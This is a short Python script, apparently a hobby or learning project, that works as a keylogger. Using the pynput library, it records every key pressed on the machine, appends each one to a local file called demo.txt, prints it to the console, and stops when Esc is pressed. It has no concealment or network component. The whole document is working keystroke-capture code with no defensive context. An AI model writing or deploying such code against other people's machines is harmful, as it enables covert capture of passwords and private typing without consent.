import os
from pynput.keyboard import Key, Listener

k = []

def on_press(key):
    k.append(key)
    write_1(key)
    print(key)

def write_1(var):
    if 'demo.txt' in os.listdir():
        with open("demo.txt",'a') as f:
            for i in str(var):
                new_var = str(i).replace("'",'')
                f.write(new_var)
                f.write(' ')
    
    elif 'demo.txt' not in os.listdir():
        with open('demo.txt','w') as f:
            for i in str(var):
                new_var = str(i).replace("'",'')
                f.write(new_var)
                f.write(' ')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()